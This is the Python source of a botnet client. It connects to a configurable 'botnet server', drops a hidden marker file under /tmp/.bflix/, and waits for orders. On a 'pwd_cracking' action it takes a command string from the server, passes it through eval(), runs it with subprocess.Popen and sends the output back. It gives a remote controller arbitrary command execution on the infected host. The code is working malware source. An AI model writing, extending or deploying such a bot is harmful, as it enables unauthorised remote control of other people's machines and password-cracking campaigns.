import socket
import subprocess
from argparse import ArgumentParser
import os

def execute_command(command):
    command = eval(command)
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    
    p.wait()
    return p.stdout.read().decode('utf-8')

def client_already_exists():
    path = "/tmp/.bflix/client.init"
    if os.path.isfile(path):
        return True
    else:
        return False

def client_initated():
    path = "/tmp/.bflix/client.init"
    if not os.path.isdir("/tmp/.bflix/"):
        os.mkdir("/tmp/.bflix/")
    file = open(path, "w")
    file.close()

if __name__ == '__main__':

    if not client_already_exists():

        parser = ArgumentParser()
        parser.add_argument("-p", "--port", default="9090", help="Port of the botnet server")
        parser.add_argument("-i", "--interface", default="localhost", help="IP of the botnet server")
        args = parser.parse_args()


        ClientMultiSocket = socket.socket()
        host = args.interface
        port = int(args.port)

        try:
            ClientMultiSocket.connect((host, port))
        except socket.error as e:
            print(str(e))

        client_initated() # Create a file to identify that the client is initiated for this host.
        while True:
            print("Connected to the server")
            print("Waiting for actions...")
            action = ClientMultiSocket.recv(1024)
            action_d = action.decode('utf-8')
            print("Action received: {}".format(action_d))
            if action_d == "connected":
                continue
            elif action_d == "pwd_cracking":
                command = ClientMultiSocket.recv(1024)
                output = execute_command(command.decode('utf-8'))
                ClientMultiSocket.send(str.encode(output))

        ClientMultiSocket.close()
    else:
        print("Client already initiated")